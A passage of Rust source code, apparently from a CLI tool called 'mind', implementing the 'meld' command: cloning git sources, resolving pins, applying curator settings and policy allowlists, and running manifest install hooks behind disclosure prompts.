//! Command implementations, one public function per CLI verb.

use std::collections::{BTreeSet, HashSet};
use std::io::Write;

use serde::Serialize;

use crate::catalog::{self, CatalogItem};
use crate::config::Config;
use crate::error::{ItemKind, MindError, Result};
use crate::git;
use crate::install;
use crate::manifest::Manifest;
use crate::mindfile::AuthFailureAction;
use crate::mindfile::HookEvent;
use crate::mindfile::MindToml;
use crate::paths::Paths;
use crate::plugin_manifest;
use crate::policy::Policy;
use crate::resolve::{
    is_glob, parse_item_ref, resolve, select, select_by_bare_refs, select_installed,
    source_matches, source_matches_glob,
};
use crate::source::{
    HookOrigin, ManifestOrigin, Pin, RecordedEvent, Registry, parse_spec, parse_spec_quiet,
};

/// `mind meld <repo> [--as <prefix>] [--root <dir>] [--follow-branch|--pin-tag|--pin-ref]`
/// — register and clone a source.
///
/// If the source's `mind.toml` lists nested `[discover].sources`, each is melded
/// too (recursively), so a repo can act as a curated super-source. Nested
/// sources are skipped if already registered, and cycles are guarded by URL.
///
/// Returns a `MeldSummary` with the data needed for the caller to emit a combined
/// JSON object (CLI-156): the dispatcher folds the post-meld install outcome into
/// ONE JSON result rather than letting each step emit separately.
#[allow(clippy::too_many_arguments)]
pub fn meld(
    paths: &Paths,
    repo: &str,
    alias: Option<String>,
    roots: Vec<String>,
    add_roots: Vec<String>,
    flat_skills: bool,
    pin: PinRequest,
    install_hook: Option<String>,
    dangerously_skip_install_hook_check: bool,
    item_kind: Option<ItemKind>,
) -> Result<MeldSummary> {
    paths.ensure_layout()?;
    // POL-3: the managed policy is authoritative over user intent. Load it once
    // (Err = invalid policy, fail closed via `?`; None = unmanaged, inert).
    let policy = Policy::load()?;
    // CLI-19: prefer SSH for remotes when the user's config asks for it.
    let prefer_ssh = Config::load(paths)?.ssh;
    let mut registry = Registry::load(paths)?;
    let mut visited = HashSet::new();
    // spec: STO-58 -- the reported identity includes the consumer alias, so the
    // deferred JSON install and the caller's post-meld steps target this instance.
    // spec: CLI-216 -- an identity-only parse: `meld_recursive` below performs
    // the parse that really decides which reading gets cloned, and that one
    // carries the CLI-215 note.
    let source_name = parse_spec_quiet(repo)
        .map(|mut s| {
            s.apply_alias(alias.clone());
            s.name
        })
        .unwrap_or_else(|_| repo.to_string());
    let mut meld_skipped: Vec<SkippedEntry> = Vec::new();
    let added = meld_recursive(
        paths,
        &mut registry,
        repo,
        alias,
        roots,
        add_roots,
        flat_skills,
        pin,
        true,
        &mut visited,
        policy.as_ref(),
        install_hook,
        dangerously_skip_install_hook_check,
        prefer_ssh,
        false, // yes: top-level meld does not yet thread --yes (non-TTY always fires NS-45)
        None,  // a top-level meld has no curator-supplied configuration
        &mut meld_skipped,
        item_kind, // spec: CLI-239 -- the consumer's `--kind` for a file link
        None,      // a top-level meld has no curator
    )?;
    registry.save(paths)?;
    // JSON emission is deferred to the dispatcher (main.rs) so the install
    // outcome can be folded into ONE object (CLI-156). Human output is still
    // printed here because it is unrelated to the install step.
    let out = crate::render::ctx();
    if !out.json && added > 1 {
        println!("melded {added} source(s)");
    }
    Ok(MeldSummary {
        source_name,
        added,
        skipped: meld_skipped,
    })
}

/// DSC-56: after melding a source that curates other sources (`[discover].sources`),
/// point the user at `mind probe` to browse what is now available. No-op for a
/// source with no nested sources, and silent under `--json`.
pub fn maybe_probe_hint(paths: &Paths, source_name: &str) -> Result<()> {
    let out = crate::render::ctx();
    if out.json {
        return Ok(());
    }
    let registry = Registry::load(paths)?;
    let Some(source) = registry.find(source_name) else {
        return Ok(());
    };
    // spec: LNK-8 -- an item-link instance adopts no curator layer, so the
    // browse hint would be misleading.
    if source.item_path.is_some() {
        return Ok(());
    }
    let clone_dir = source.clone_dir(paths);
    let curates = MindToml::load(&clone_dir)?
        .and_then(|m| m.discover)
        .is_some_and(|d| !d.sources.is_empty());
    // MKT-7: a marketplace source is also a curated super-source; fire the
    // probe hint so the user knows to browse what became available.
    let has_marketplace = plugin_manifest::find_marketplace_manifest(&clone_dir).is_some();
    if curates || has_marketplace {
        println!(
            "note: this source curates other sources; run `mind probe` to browse and search what is available"
        );
    }
    Ok(())
}

/// A consumer's pin intent from the `meld` CLI flags (CLI-17, CLI-200..202),
/// before it is resolved against the source. Kept distinct from [`Pin`] because a
/// freeze (`--pin`) resolves to a concrete commit only after the checkout.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub enum PinRequest {
    /// No consumer pin flag; the lower-precedence layers decide (DSC-41, LNK-3).
    #[default]
    None,
    /// Freeze to an immutable commit (CLI-200). `Some(ref)` (`--pin <ref>`)
    /// resolves and freezes that branch/tag/commit; `None` (`--pin HEAD`) freezes
    /// the floating tip the lower layers selected.
    Freeze(Option<String>),
    /// Track a moving point (CLI-201, from `--pin branch=`/`--pin tag=`): a
    /// `FollowBranch` or `Tag`, or `DefaultBranch` via a lower-precedence layer.
    Follow(Pin),
}

/// Parse the pin CLI flags into a single [`PinRequest`] (CLI-17, CLI-200..202).
/// Accepts the current `--pin` flag plus the deprecated
/// `--follow-branch`/`--pin-tag`/`--pin-ref` aliases; more than one set flag is a
/// `ConflictingPin` error. The flags are kept independent at the clap layer so
/// this structured error is what the user sees, rather than a clap usage string.
///
/// Each supplied ref value is validated with [`crate::git::validate_ref_value`] so
/// a leading-dash value is rejected with `InvalidRef` before it can reach any git
/// subprocess (DSC-66).
pub fn parse_pin_flags(
    pin: Option<String>,
    follow_branch: Option<String>,
    pin_tag: Option<String>,
    pin_ref: Option<String>,
) -> Result<PinRequest> {
    // Collect the set flags as (flag-name, request) so at-most-one is enforced
    // uniformly across `--pin` and the deprecated aliases (CLI-202).
    let mut set: Vec<(&str, PinRequest)> = Vec::new();
    if let Some(v) = pin {
        set.push(("--pin", parse_pin_value(v)?));
    }
    if let Some(b) = follow_branch {
        crate::git::validate_ref_value(&b)?;
        set.push(("--follow-branch", PinRequest::Follow(Pin::FollowBranch(b))));
    }
    if let Some(t) = pin_tag {
        crate::git::validate_ref_value(&t)?;
        set.push(("--pin-tag", PinRequest::Follow(Pin::Tag(t))));
    }
    if let Some(r) = pin_ref {
        crate::git::validate_ref_value(&r)?;
        set.push(("--pin-ref", PinRequest::Freeze(Some(r))));
    }
    if set.len() > 1 {
        return Err(MindError::ConflictingPin {
            first: set[0].0.to_string(),
            second: set[1].0.to_string(),
        });
    }
    Ok(set.into_iter().next().map_or(PinRequest::None, |(_, r)| r))
}

/// Parse the required `--pin` value into a [`PinRequest`] (CLI-200, CLI-201).
/// `HEAD` freezes the resolved tip to its commit; `branch=<name>` / `tag=<name>`
/// follow a branch / moving tag; anything else is a ref (tag/sha/branch) that is
/// resolved and frozen. A value carrying an unrecognized `key=` form is a
/// `BadPinSpec` usage error so a mistyped key (e.g. `brnach=x`) is not silently
/// treated as a ref name.
fn parse_pin_value(value: String) -> Result<PinRequest> {
    if value == "HEAD" {
        return Ok(PinRequest::Freeze(None));
    }
    if let Some(name) = value.strip_prefix("branch=") {
        crate::git::validate_ref_value(name)?;
        return Ok(PinRequest::Follow(Pin::FollowBranch(name.to_string())));
    }
    if let Some(name) = value.strip_prefix("tag=") {
        crate::git::validate_ref_value(name)?;
        return Ok(PinRequest::Follow(Pin::Tag(name.to_string())));
    }
    if value.contains('=') {
        return Err(MindError::BadPinSpec { value });
    }
    crate::git::validate_ref_value(&value)?;
    Ok(PinRequest::Freeze(Some(value)))
}

/// Resolve a consumer `--pin` request against the lower-precedence base point
/// (CLI-17, CLI-200..202): what a bare `--pin HEAD` freezes. `meld_recursive`
/// passes the curator/link/directive-resolved base (Step 2); `repin_source`
/// (CLI-209) passes the source's currently recorded pin, so a re-meld's
/// `--pin HEAD` freezes whatever the source is pinned/following today.
/// `checkout_pin` is what gets checked out; `freeze` is whether the resolved
/// commit is then persisted as an immutable `ref` pin instead of `checkout_pin`
/// itself.
fn resolve_checkout_pin(consumer_pin: PinRequest, base_pin: Pin) -> (Pin, bool) {
    match consumer_pin {
        PinRequest::None => (base_pin, false),
        PinRequest::Follow(p) => (p, false),
        PinRequest::Freeze(Some(r)) => (Pin::Ref(r), true),
        PinRequest::Freeze(None) => (base_pin, true),
    }
}

/// A short human description of a `Pin` for the hook disclosure (HOOK-20).
/// Shared by `meld_recursive` and `upgrade` so both render the pin the same way.
pub(crate) fn pin_description(pin: &Pin) -> String {
    match pin {
        Pin::DefaultBranch => "default branch".to_string(),
        Pin::FollowBranch(b) => format!("branch {b}"),
        Pin::Tag(t) => format!("tag {t}"),
        Pin::Ref(r) => format!("ref {r}"),
    }
}

/// Resolve a source's clone directory (`Source::clone_dir`) and confine it to
/// the managed sources tree before any caller mutates it (clone, re-clone, or
/// `remove_dir_all`). STO-69: a stale or hand-tampered `sources.json` entry
/// (e.g. `host`/`owner`/`repo` parts containing `..`) must not let `mind`
/// write or delete outside `~/.mind/sources`. Mirrors the confinement check
/// `install.rs` already applies to a manifest's store/link paths (LIFE-44).
///
/// A linked local source (`Source::is_linked`) is exempt: its "clone dir" is
/// the user's own working tree by design (CLI-27), not a path under the
/// sources tree, so it is returned unchecked.
// spec: STO-69
fn clone_dir_checked(paths: &Paths, source: &crate::source::Source) -> Result<std::path::PathBuf> {
    let dir = source.clone_dir(paths);
    if source.is_linked() {
        return Ok(dir);
    }
    if install::is_confined_under(&dir, &paths.sources_dir()) {
        Ok(dir)
    } else {
        Err(MindError::UnsafeClonePath {
            path: dir,
            identity: source.name.clone(),
        })
    }
}

/// Whether a recorded hook has already run at `current` (a real commit) FOR
/// THIS EVENT.
///
/// The event is part of the key (HOOK-124): a source that declares the same
/// command for both `install` and `update` records two independent runs, so
/// running the install hook must not make the update hook look already-run
/// (and vice versa).
// spec: HOOK-124
fn hook_ran_at(
    source: &crate::source::Source,
    command: &str,
    event: RecordedEvent,
    current: Option<&str>,
) -> bool {
    current.is_some()
        && source
            .install_hooks
            .iter()
            .any(|r| r.is(command, event) && r.ran_at.as_deref() == current)
}

/// Record (upsert) a hook's run state on the source, keyed by `(command,
/// event)` (HOOK-124). A run always clears the HOOK-121 baseline flag: the
/// record now describes an actual run.
fn record_install_hook(
    source: &mut crate::source::Source,
    command: &str,
    event: RecordedEvent,
    ran_at: Option<String>,
) {
    if let Some(r) = source
        .install_hooks
        .iter_mut()
        .find(|r| r.is(command, event))
    {
        r.ran_at = ran_at;
        r.baseline = false;
    } else {
        let mut rec = crate::source::RecordedSourceHook::install(command, ran_at);
        rec.event = Some(event);
        source.install_hooks.push(rec);
    }
}

/// Record a hook whose provenance is not the source's own manifest, or that has
/// not run at all.
///
/// Used for the two records `upgrade` cannot reconstruct from the clone: a
/// consumer `--install-hook` override (HOOK-56) and a curated
/// `[[discover.sources.hooks]]` entry (DSC-61, HOOK-127), which is why the
/// label and the `optional` flag are stored alongside the command. Also used
/// for the HOOK-121 baseline: a declared update hook recorded at the meld
/// commit WITHOUT running, so it is not pending until the source moves.
/// Existing records are left alone: a real run must never be overwritten by a
/// later baseline.
fn record_source_hook_entry(
    source: &mut crate::source::Source,
    hook: &crate::mindfile::ResolvedHook,
    event: RecordedEvent,
    ran_at: Option<String>,
    origin: Option<crate::source::HookOrigin>,
    baseline: bool,
) {
    if let Some(r) = source
        .install_hooks
        .iter_mut()
        .find(|r| r.is(&hook.run, event))
    {
        r.origin = origin.or(r.origin);
        if origin.is_some() {
            r.name = hook.name.clone();
            r.optional = hook.optional;
        }
        return;
    }
    source
        .install_hooks
        .push(crate::source::RecordedSourceHook {
            command: hook.run.clone(),
            ran_at,
            event: Some(event),
            name: origin.is_some().then(|| hook.name.clone()).flatten(),
            optional: origin.is_some() && hook.optional,
            origin,
            baseline,
        });
}

/// What the caller should do with the source after a hook batch.
enum HookOutcome {
    Proceed,
    Abort,
}

/// Run a source's install hooks (HOOK-50..60). Offers each install hook unless it
/// already ran at the source's current commit (offers all when `force_rerun`).
/// Prompts per the optional (run/skip) vs required (run/skip/abort) model, runs
/// chosen hooks in `clone_dir` printing a running indication (HOOK-60), and upserts
/// each into `source.install_hooks`. A required hook's Abort returns `Abort`; any
/// hook's non-zero exit propagates as `Err` (HOOK-53), leaving cleanup to the
/// caller (meld removes the clone; re-meld leaves the source). `install_override`
/// is the consumer `--install-hook` command (meld only).
///
/// Only INSTALL hooks run here (HOOK-121: `meld` is by definition not the state
/// the update event describes). The declared update hooks are still recorded, at
/// the meld commit and as baselines that never ran, so the first `upgrade` at an
/// unmoved source finds nothing pending instead of running a migration against
/// the very commit that was just installed.
#[allow(clippy::too_many_arguments)]
fn run_install_hooks(
    source: &mut crate::source::Source,
    clone_dir: &std::path::Path,
    mindfile: &Option<MindToml>,
    toml_path: &std::path::Path,
    install_override: Option<&str>,
    dangerously_skip: bool,
    force_rerun: bool,
    extra_hooks: Vec<crate::mindfile::ResolvedHook>,
) -> Result<HookOutcome> {
    let mut resolved = mindfile
        .as_ref()
        .map(|m| m.resolved_hooks(toml_path))
        .transpose()?
        .unwrap_or_default();
    // DSC-61, HOOK-127: curator-supplied hooks (when applied) run after the
    // source's own, through the exact same override/disclosure/decide/run path
    // below. They are remembered as curated so a later `upgrade` can still
    // offer them: they live in the PARENT's manifest, so the clone can never be
    // asked what it declares.
    let curated_keys: HashSet<(String, &'static str)> = extra_hooks
        .iter()
        .map(|h| (h.run.clone(), h.event.as_str()))
        .collect();
    resolved.extend(extra_hooks);
    let (hooks, replaced) = crate::hook::apply_install_override(resolved, install_override);
    // An empty or whitespace-only `--install-hook` is absent (HOOK-3), the same
    // reading `apply_install_override` applies.
    let override_cmd: Option<&str> = install_override.map(str::trim).filter(|s| !s.is_empty());
    // HOOK-56, HOOK-127: where each hook came from, when it is not one the
    // source's own manifest declares. Determines what is stamped on the record.
    let origin_of = |h: &crate::mindfile::ResolvedHook| -> Option<HookOrigin> {
        if h.event == HookEvent::Install && override_cmd == Some(h.run.as_str()) {
            Some(HookOrigin::Override)
        } else if curated_keys.contains(&(h.run.clone(), h.event.as_str())) {
            Some(HookOrigin::Curated)
        } else {
            None
        }
    };

    let pin_desc = pin_description(&source.pin);
    let commit = source.commit.clone().unwrap_or_default();
    let current = source.commit.clone();
    let clone_path = clone_dir.display().to_string();
    let name = source.name.clone();

    for h in hooks.iter().filter(|h| h.event == HookEvent::Install) {
        // HOOK-60: by default re-offer only hooks not yet run at this commit;
        // `--force` (force_rerun) re-offers every install hook.
        if !force_rerun && hook_ran_at(source, &h.run, RecordedEvent::Install, current.as_deref()) {
            continue;
        }

        // HOOK-56: show the loud override note on the hook the override produced.
        let declared_override: Option<String> = replaced.as_ref().and_then(|cmds| {
            if override_cmd == Some(h.run.as_str()) {
                Some(cmds.join("; "))
            } else {
                None
            }
        });
        // spec: HOOK-24 - show a browse URL pinned to the disclosed commit
        // when the source has a GitHub-shaped https remote.
        let browse_url = source.browse_url(&commit);
        let disclosure = crate::hook::hook_disclosure_text(
            h.label(),
            h.event.as_str(),
            h.optional,
            &name,
            &pin_desc,
            &commit,
            &clone_path,
            &h.run,
            declared_override.as_deref(),
            browse_url.as_deref(),
        );

        match crate::hook::decide(&disclosure, h.optional, dangerously_skip)? {
            crate::hook::HookAct::Run => {
                // HOOK-60: indicate the running hook. A progress line, not an
                // aside: stdout in text mode, and unreachable from `--json`
                // stdout because the run's fd 1 points at stderr (main.rs's
                // `json_stdout`). spec: CLI-217
                println!("running install hook '{}' for {}", h.label(), name);
                // HOOK-53: a non-zero exit (optional or required) is a hard stop.
                crate::hook::run_hook(&h.run, clone_dir, &name, "install", h.label())?;
                record_install_hook(source, &h.run, RecordedEvent::Install, current.clone());
                stamp_origin(source, h, RecordedEvent::Install, origin_of(h));
            }
            crate::hook::HookAct::Skip => {
                // spec: CLI-217 -- `meld --json` reaches this (the no-TTY skip
                // path), and the meld result object is printed after it.
                crate::render::note(format!(
                    "note: skipped install hook '{}' for {}; its items may not work until it runs",
                    h.label(),
                    name
                ));
                record_install_hook(source, &h.run, RecordedEvent::Install, None);
                stamp_origin(source, h, RecordedEvent::Install, origin_of(h));
            }
            crate::hook::HookAct::Abort => return Ok(HookOutcome::Abort),
        }
    }

    // spec: HOOK-121 -- record every declared update hook at the meld commit,
    // as a baseline that never ran. Without this the hook has no record at all,
    // "absent" reads as pending, and the very next `upgrade` runs an update
    // migration against the commit `meld` just installed -- on a source that
    // has not moved. An existing record (a real run, or a re-meld's baseline)
    // is left alone.
    for h in hooks.iter().filter(|h| h.event == HookEvent::Update) {
        record_source_hook_entry(
            source,
            h,
            RecordedEvent::Update,
            current.clone(),
            origin_of(h),
            true,
        );
    }

    Ok(HookOutcome::Proceed)
}

/// Stamp a record's provenance after [`record_install_hook`] created it, for a
/// hook that did not come from the source's own manifest (HOOK-56, HOOK-127).
/// A no-op for an ordinary declared hook.
fn stamp_origin(
    source: &mut crate::source::Source,
    hook: &crate::mindfile::ResolvedHook,
    event: RecordedEvent,
    origin: Option<HookOrigin>,
) {
    if origin.is_none() {
        return;
    }
    record_source_hook_entry(source, hook, event, None, origin, false);
}

/// Curator-supplied configuration for a nested source, lifted from a parent
/// super-source's `[discover].sources` entry (DSC-59). Resolved by the parent
/// before recursing; the pin is always applied (DSC-65, authoritative); roots
/// and hooks are gated (DSC-60) and applied only when the nested source has no
/// `mind.toml` of its own.
pub(crate) struct CuratedConfig {
    /// The curator pin directive (follow-branch, pin-tag, or pin-ref), if set.
    /// Authoritative: applied whether or not the nested source has a mind.toml
    /// (DSC-65). NOT included in the DSC-60 gating/warning.
    pin: Option<Pin>,
    /// The curator `roots`, if set (an explicit empty list is preserved).
    /// Gated by DSC-60: only applied when the nested source has no mind.toml.
    roots: Option<Vec<String>>,
    /// The curator `add-roots` (DSC-88), if set. Gated by DSC-60/DSC-88: only
    /// applied when the nested source has no mind.toml of its own, same as
    /// `roots` -- an authoritative nested manifest is an export-control
    /// decision (DSC-60) and a curator's `add-roots` must not bypass it.
    add_roots: Option<Vec<String>>,
    /// The curator `flat-skills` (DSC-77). Gated by DSC-60: only applied when the
    /// nested source has no mind.toml of its own.
    flat_skills: bool,
    /// The curator `[[discover.sources.hooks]]`, resolved in declaration order.
    /// Gated by DSC-60: only applied when the nested source has no mind.toml.
    hooks: Vec<crate::mindfile::ResolvedHook>,
}

impl CuratedConfig {
    /// Whether any DSC-60-GATED values (roots, add-roots, or hooks) are
    /// present, so the "ignored" warning is warranted when the nested source
    /// has its own `mind.toml`. The pin is NOT gated (DSC-65) and does NOT
    /// participate.
    fn has_gated_values(&self) -> bool {
        self.roots.is_some()
            || self.add_roots.is_some()
            || self.flat_skills
            || !self.hooks.is_empty()
    }
}

/// Lift a `[discover].sources` entry's curator-supplied configuration (DSC-59)
/// into the shape `meld_recursive` applies.
///
/// One definition for all three readers of a curator's list: the nested loop in
/// `meld_recursive`, `sync`'s DSC-57 re-walk, and `curate`'s plan (curate.md
/// CUR-3). Without it, a key added to the entry shape has to be threaded into
/// each site by hand, and a site that forgets it silently drops the curator's
/// directive.
///
/// spec: DSC-88 -- `add-roots` is GATED (DSC-60), same as roots/flat-skills/
/// hooks: it must not reach into a nested source that ships its own mind.toml
/// and bypass its authoritative export list (DSC-3). Routed through
/// `CuratedConfig` (not the consumer `--add-root` slot) so `meld_recursive`
/// applies it only when the nested source has no `mind.toml` of its own.
pub(crate) fn curated_config_for(
    entry: &crate::mindfile::NestedSource,
    toml_path: &std::path::Path,
) -> Result<CuratedConfig> {
    Ok(CuratedConfig {
        pin: entry.pin_directive(toml_path)?,
        roots: entry.roots.clone(),
        add_roots: entry.add_roots.clone(),
        flat_skills: entry.flat_skills,
        hooks: entry.resolved_hooks(toml_path)?,
    })
}

/// Meld one source and then its nested sources. Returns how many sources were
/// newly added to the registry. `top_level` distinguishes the user's own meld
/// (errors on a duplicate) from a curated nested meld (skips a duplicate).
///
/// `consumer_pin` is the caller-supplied pin (CLI flags or None for a nested
/// source that inherits no pin override).
/// `roots` is the consumer `--root` override (empty => no override).
///
/// `curated` carries the curator-supplied configuration from a parent
/// super-source's `[discover].sources` entry (DSC-59): a follow-branch pin,
/// scan roots, and lifecycle hooks. These apply only when the nested source
/// ships no `mind.toml` of its own (DSC-60); when it does, they are ignored with
/// a warning. `None` for a top-level meld or a nested source with no curator
/// configuration.
/// `yes` mirrors the CLI `--yes` flag (NS-45): when true, non-interactive mode
/// is forced (the NS-43 collision prompt is skipped and hard-errors instead).
#[allow(clippy::too_many_arguments)]
fn meld_recursive(
    paths: &Paths,
    registry: &mut Registry,
    repo: &str,
    alias: Option<String>,
    roots: Vec<String>,
    add_roots: Vec<String>,
    flat_skills: bool,
    consumer_pin: PinRequest,
    top_level: bool,
    visited: &mut HashSet<String>,
    policy: Option<&Policy>,
    install_hook: Option<String>,
    dangerously_skip_hook_check: bool,
    prefer_ssh: bool,
    yes: bool,
    curated: Option<CuratedConfig>,
    skipped: &mut Vec<SkippedEntry>,
    item_kind: Option<ItemKind>,
    curated_by: Option<String>,
) -> Result<usize> {
    let out = crate::render::ctx();
    let mut source = parse_spec(repo)?;
    // spec: LNK-22 CLI-239 DSC-100 -- the consumer's (or curator's) explicit
    // kind for a file link, recorded on the instance and read by every later
    // scan. Applied before the catalog scan below, which resolves the kind.
    source.item_kind = item_kind;
    // spec: STO-82 -- provenance: which curator's list this registration came
    // from. Recorded unconditionally (it is not curator CONFIGURATION, so the
    // DSC-60 gate that gags roots/hooks/flat-skills does not apply to it), and
    // read back by `curate` to tell an unlisted source from a directly melded
    // one (curate.md CUR-7).
    source.curated_by = curated_by;
    // NS-25: reject a reserved-kind-word prefix at the chokepoint where any alias
    // (top-level `--as`, or a nested source's `as =`) is applied. An empty alias
    // ("no prefix") is accepted by validate_prefix.
    if let Some(a) = &alias {
        crate::namespace::validate_prefix(a)?;
    }
    // spec: STO-58 -- the alias is part of the source identity, so applying it
    // folds `@<alias>` into `name` (composing with an item-link `#<path>`). This
    // is what makes `meld <repo> --as <prefix>` a distinct instance that coexists
    // with the bare repo and with other aliases.
    source.apply_alias(alias);
    // CLI-19: rewrite an https remote to its SSH form when SSH is preferred, so
    // the clone uses the user's key (no https username/password prompt). Done
    // before the cycle guard so the recorded URL is the one we actually clone.
    source.prefer_ssh(prefer_ssh);

    // spec: LNK-3 -- an item link carries its pin in the URL ref; lift it so
    // the standard pin resolution below can layer a consumer flag over it and
    // the pre-pin code sees the default (a link is never a linked local tree).
    let url_pin = if source.item_path.is_some() && source.pin != Pin::DefaultBranch {
        Some(std::mem::replace(&mut source.pin, Pin::DefaultBranch))
    } else {
        None
    };

    // Cycle guard: don't process the same source twice in one meld run. Keyed
    // on identity + URL: item-link instances share their repo's URL but are
    // distinct sources (LNK-4), while a same-name re-spec still reaches the
    // registry check below for its "already melded" warning.
    if !visited.insert(format!("{}|{}", source.name, source.url)) {
        return Ok(0);
    }

    if let Some(existing) = registry.find(&source.name) {
        if top_level {
            return Err(MindError::SourceExists {
                name: source.name.clone(),
                url: existing.url.clone(),
            });
        }
        if existing.url != source.url {
            eprintln!(
                "warning: source name '{}' already melded from {}; skipping {}",
                source.name, existing.url, source.url
            );
        }
        return Ok(0);
    }

    // `source.pin` is still the default here, so `clone_dir` resolves a local
    // source to its working tree. A consumer/directive pin (resolved below) can
    // still switch a local source to a cloned snapshot.
    let mut dir = clone_dir_checked(paths, &source)?;
    let is_local = source.is_local();

    if !out.json {
        println!(
            "{} melding {} from {}",
            out.bullet(),
            source.name,
            out.dim(&source.url)
        );
    }

    // spec: POL-36 -- the allow/lock check requires only the parsed source
    // identity (available now, before any clone). Hoisting it here ensures no
    // git network call or directory creation occurs for a refused source (E14).
    // The pinned check (POL-20) stays post-clone because it needs the effective
    // pin, which may come from the source's mind.toml (read after the clone).
    if let Some(policy) = policy {
        // spec: LNK-11 -- allowlist matching uses the base repo identity, so a
        // policy that allows the repo allows links into it.
        let identity = source.base_identity();

        // spec: POL-56 -- when allow-local is false under a lock, local-path
        // and file:// melds are refused regardless of allow patterns. This check
        // precedes the allow-pattern check so the error message names the
        // allow-local reason rather than a pattern miss.
        if policy.lock() && !policy.allow_local() && is_local {
            if let Some(path) = effective_policy_path() {
                // spec: POL-37 (same hint pattern as SourceNotAllowed)
                eprintln!("hint: managed policy at {path}");
            }
            return Err(MindError::LocalMeldForbidden { identity });
        }

        let allowed = policy.allow_matches(&identity);
        if policy.lock() && !allowed {
            // spec: POL-11, POL-36 -- refused before any clone or dir creation.
            // Print the policy file path so the developer knows where to look.
            if let Some(path) = effective_policy_path() {
                // spec: POL-37
                eprintln!("hint: managed policy at {path}");
            }
            return Err(MindError::SourceNotAllowed { identity });
        }
        if !policy.lock() && !allowed {
            // POL-13: with lock off, allow is advisory; warn but proceed.
            eprintln!(
                "warning: source '{identity}' is not in the managed policy's allowlist (advisory; not enforced because [sources].lock is false)"
            );
        }
    }

    // A local source with no pin is read straight from its working tree (CLI-27):
    // no clone, and `mind` never touches the directory. Any other source is cloned
    // into the sources tree (default branch first so we can read mind.toml, then
    // re-cloned at the resolved pin if needed).
    if is_local {
        if !dir.is_dir() {
            return Err(MindError::NotADirectory {
                path: dir.display().to_string(),
            });
        }
    } else {
        if dir.exists() {
            std::fs::remove_dir_all(&dir).map_err(|e| MindError::io(&dir, e))?;
        }
        if let Some(parent) = dir.parent() {
            crate::paths::mkdir_p(parent)?;
        }
        // spec: CLI-177, CLI-178, CLI-180 -- for a top-level meld, intercept
        // clone failures to lead with git's stderr and emit auth/proxy hints.
        git::clone(&source.url, &dir).map_err(|e| {
            if top_level {
                let ssh = (!source.is_local()).then(|| source.ssh_url());
                handle_top_level_clone_err(e, ssh, &dir, out)
            } else {
                e
            }
        })?;
    }
    let mut mindfile = MindToml::load(&dir)?;
    // spec: DSC-94 -- B4: a `mind.toml [source].description` is source-
    // controlled text, sanitized here at the store point exactly like the
    // plugin-manifest path above (line ~1181), closing the frontmatter-path
    // gap for the biggest funnel of raw-ANSI/bidi-override source text.
    source.description = mindfile
        .as_ref()
        .and_then(|m| m.source.description.clone())
        .map(|d| strip_ansi(&d));

    // DSC-60: the curator-supplied roots and hooks apply only when the nested
    // source ships NO mind.toml of its own. The gate is whole-file: any nested
    // mind.toml (even one declaring none of the gated fields) suppresses roots
    // and hooks, since the source has onboarded. `as` (DSC-39) and `install`
    // (DSC-58) are not gated. DSC-65: the curator's pin directive is NOT gated
    // -- it is authoritative regardless of whether the nested source has a
    // mind.toml of its own.
    let curated = curated.unwrap_or(CuratedConfig {
        pin: None,
        roots: None,
        add_roots: None,
        flat_skills: false,
        hooks: Vec::new(),
    });
    let apply_curated = mindfile.is_none();
    // The curator pin is always extracted (DSC-65: authoritative, not gated).
    let curated_pin = curated.pin.clone();
    if !apply_curated && curated.has_gated_values() {
        // spec: DSC-60/DSC-88 — warn only when gated fields (roots/
        // add-roots/flat-skills/hooks) are present and suppressed. A pin-only
        // entry must NOT trigger this warning. `add-roots` specifically has a
        // consumer-side escape (`meld --add-root`, DSC-84) that is NOT gated,
        // so a curator's suppressed `add-roots` need not silently install
        // fewer items than before: point the consumer at applying it
        // themselves.
        let add_root_hint = if curated.add_roots.is_some() {
            // spec: CLI-225 -- `source.name` is source-influenced (derived
            // from the repo spec / `--as` alias) and lands in a pasteable
            // `mind meld <name> --add-root <dir>` remedy, so it is
            // shell-quoted before printing.
            format!(
                "; to apply add-roots yourself, run `mind meld {} --add-root <dir>` \
                 (that flag is not gated by a nested mind.toml)",
                crate::error::shell_quote(&source.name)
            )
        } else {
            String::new()
        };
        eprintln!(
            "warning: {} ships its own mind.toml; curator-supplied roots/add-roots/flat-skills/hooks are ignored{add_root_hint}",
            source.name
        );
    }
    let curated_hooks = if apply_curated {
        curated.hooks.clone()
    } else {
        Vec::new()
    };

    // Step 2: resolve the pin (CLI-17, DSC-41, DSC-65, CLI-200..202).
    // Lower-precedence layers select a floating base point:
    //   curator pin (DSC-65, authoritative) > item-link URL ref (LNK-3) >
    //   [source] directive (DSC-41) > DefaultBranch.
    let toml_path = dir.join("mind.toml");
    let directive_pin = mindfile
        .as_ref()
        .map(|m| m.source.pin_directive(&toml_path))
        .transpose()?
        .flatten();
    let base_pin = curated_pin
        .or(url_pin)
        .or(directive_pin)
        .unwrap_or(Pin::DefaultBranch);

    // The consumer flag layers over the base: `--pin branch=`/`tag=` overrides the
    // point (follow), a `--pin` freeze value fixes a point to its current commit
    // (CLI-200/201). `checkout_pin` is what we actually check out; `freeze` records
    // whether the resolved commit is then persisted as an immutable ref.
    //   - `--pin HEAD` freezes the base the lower layers chose;
    //   - `--pin <ref>` names its own point (branch, tag, or sha), checked out via
    //     the ref path (`git checkout <ref>` accepts all three) and frozen.
    let (checkout_pin, freeze) = resolve_checkout_pin(consumer_pin, base_pin);

    // spec: POL-20 -- pinned check stays post-clone because it needs the effective
    // pin, which may come from the source's mind.toml. Evaluated on the FINAL
    // persisted kind: a `--pin` freeze persists a ref, so it satisfies
    // require-pinned even when the point it freezes is an otherwise-floating branch.
    let persisted_unpinned =
        !freeze && matches!(checkout_pin, Pin::DefaultBranch | Pin::FollowBranch(_));
    if let Some(policy) = policy {
        let identity = source.name.clone();
        if policy.pinned() && persisted_unpinned {
            // POL-20: pinned policy forbids a floating branch (default branch or
            // follow-branch); only a tag / ref / frozen pin is permitted.
            if !is_local {
                let _ = std::fs::remove_dir_all(&dir);
            }
            return Err(MindError::UnpinnedSourceForbidden { identity });
        }
    }

    // Step 3: if the checkout point is not DefaultBranch, the source is a clone at
    // that point -- including a *pinned local* source, which is snapshotted into
    // the sources tree (so pinning still works) WITHOUT touching the working tree.
    // A pin that does not resolve is a `Git` error that must leave nothing behind
    // (CLI-18); the clone target is always under the sources tree, never the user's
    // working tree.
    if checkout_pin != Pin::DefaultBranch {
        // Setting the pin makes `clone_dir` resolve to the sources-tree path even
        // for a local source.
        source.pin = checkout_pin.clone();
